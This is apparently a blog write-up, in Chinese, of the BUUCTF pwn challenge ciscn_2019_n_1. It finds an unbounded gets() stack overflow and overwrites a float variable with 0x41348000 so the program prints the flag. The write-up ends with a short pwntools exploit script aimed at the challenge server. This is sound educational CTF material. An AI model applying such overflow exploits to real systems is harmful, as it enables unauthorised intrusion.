---
title: "BUUCTF Pwn Ciscn_2019_n_1"
date: 2020-02-07T12:57:45+08:00
author: NiceSeven
categories:
  - BUUCTF
tags:
  - Pwn
---

# ciscn_2019_n_1

checksec检查

![image-20200207131806307](/images/image-20200207131806307.png)

64位程序开启NX

运行一下看看功能

![image-20200207131847240](/images/image-20200207131847240.png)

等待输入，有个tips：11.28125

拖入ida分析

![image-20200207132151820](/images/image-20200207132151820.png)

main()函数调用func()函数

![image-20200207132124090](/images/image-20200207132124090.png)

看到gets()未做限制明显栈溢出，if判断成功执行cat flag

![image-20200207132549732](/images/image-20200207132549732.png)

变量v1和v2处在同一个栈上，偏移0x30-0x4

![image-20200207132504515](/images/image-20200207132504515.png)

思路：使用gets()通过v1覆盖v2为11.28125，从而满足if判断执行cat flag

![image-20200207133124150](/images/image-20200207133124150.png)

![image-20200207133040893](/images/image-20200207133040893.png)

查看11.28125在程序中的表示为0x41348000

编写exp

```python
#！/usr/bin/env python
#-*-coding=UTF-8-*-
from pwn import *
sh = remote('node3.buuoj.cn',27485)
payload = 'a'*(0x30-0x4) + p64(0x41348000)
#这里不能直接使用p64(11.28125),转换出来与程序中的0X41348000不符，会导致if判断不成功
sh.sendlineafter("Let's guess the number.\n",payload)
sh.interactive()
```

![image-20200207134230277](/images/image-20200207134230277.png)

